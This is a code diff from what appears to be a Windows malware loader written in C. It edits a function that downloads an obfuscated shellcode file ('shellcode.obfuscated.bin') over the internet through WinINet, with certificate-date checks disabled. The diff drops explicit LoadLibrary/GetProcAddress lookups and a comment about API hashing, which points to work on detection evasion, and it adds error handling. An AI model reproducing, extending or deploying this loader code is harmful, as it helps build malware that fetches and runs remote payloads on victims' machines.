@@ -45,8 +45,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 }
 #endif
 
-// TODO: API hashing
-BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) 
+BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
 {
 
 	HANDLE		hInternet = NULL, hInternetFile = NULL;
@@ -67,27 +66,12 @@ BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.', L'o', L'b', L'f', L'u', L's', L'c', L'a', L't', L'e', L'd', L'.', L'b', L'i', L'n', L'\0'
 	};
 
-	HMODULE hWininet = LoadLibraryA("wininet.dll");
-	if (!hWininet) {
-		PRINTA("Failed to load wininet.dll\n");
-		return 1;
-	}
-
-	g_Api.pInternetOpenW = (fnInternetOpenW)GetProcAddress(hWininet, "InternetOpenW");
-	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddress(hWininet, "InternetCloseHandle");
-	g_Api.pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddress(hWininet, "InternetOpenUrlW");
-	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
-	g_Api.pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddress(hWininet, "InternetSetOptionW");
-
-	if (!g_Api.pInternetOpenW || !g_Api.pInternetCloseHandle || !g_Api.pInternetOpenUrlW || !g_Api.pInternetReadFile || !g_Api.pInternetSetOptionW) {
-		PRINTA("Failed to get function addresses\n");
-		// TODO: use API hashing for this function
-		FreeLibrary(hWininet);
-		return 1;
-	}
-
 	// Opening an internet session handle
 	hInternet = g_Api.pInternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	if (!hInternet) {
+		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
 
 	// Opening a handle to the payload's URL
 	hInternetFile = g_Api.pInternetOpenUrlW(
@@ -98,6 +82,10 @@ BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
 		NULL
 	);
+	if (!hInternetFile) {
+		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
 
 	// Dynamic memory allocation for the payload
 	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
